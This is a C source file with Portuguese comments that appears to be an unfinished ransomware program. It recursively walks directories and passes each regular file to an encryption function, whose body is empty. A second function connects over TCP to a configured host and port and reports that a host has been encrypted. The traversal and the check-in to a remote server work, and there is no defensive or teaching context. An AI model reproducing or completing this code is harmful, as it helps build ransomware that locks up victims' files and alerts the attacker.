#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h> 
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "funcs.h"

char blacklist[][40] = {".", "..",".speech-dispatcher","X11"};
struct dirent *getdir;

void WhatIsDir(char *dir_sch){
	/* Data Type: DIR
	 * The DIR data type represents a directory stream.
     */
	struct stat veirify;
	DIR *diretorio;
	char pathdir[1024];
	diretorio = opendir(dir_sch);
	/*As funções opendir () e fdopendir () retornam um ponteiro para o
       fluxo de diretório. Em caso de erro, NULL é retornado e errno é definido
       para indicar o erro.
	*/
	if(diretorio == NULL){
		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n", diretorio);
		return;
	}
	//Lendo entradas de diretorio e guardando na struct dirent getdir
	while((getdir = readdir(diretorio)) != NULL){

		//Compara o elemento d_name da struct dirent, caso ele seja igual a .. ou . e pula os comandos intermediarios
		if(strncmp(getdir->d_name,".",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0) continue;
		if(strncmp(getdir->d_name,".speech-dispatcher",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"X11", sizeof(getdir->d_name)) == 0) continue;
		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);

		stat(pathdir , &veirify);

		if(S_ISDIR(veirify.st_mode)){
			
			strncat(pathdir, "/", sizeof(pathdir)-1);
			printf("%s\n", pathdir);
			printf("[ENTRANDO NO DIRETORIO]:  %s\n", getdir->d_name);
			WhatIsDir(pathdir);
		}
		else if(!S_ISLNK(veirify.st_mode)){
			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", getdir->d_name);
			encryptfile(pathdir);
		}

	}
	closedir(diretorio);
}
void connectserver(){
	int sockfd;
	int status;
	char buffer[100] = "[INFO]: UM HOST FOI CRIPTOGRAFADO :]\n";
	char ip[30];
	struct sockaddr_in my_addr = {
		.sin_family = AF_INET,
		.sin_port = htons(myport),
		.sin_addr.s_addr = inet_addr(myhost),	
	};

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0){
		printf("[INFO]: Ocorreu um erro ao tentar criar o socket!");
	}
	status = connect(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr));
	if(status < 0){
		printf("[INFO]: Ocorreu um erro ao tentar se connectar ao servidor!");
	}
	send(sockfd, buffer, sizeof(buffer), 0);
}

void encryptfile(char *name_dir){
	int len = sizeof(getdir->d_name);

	

	
}
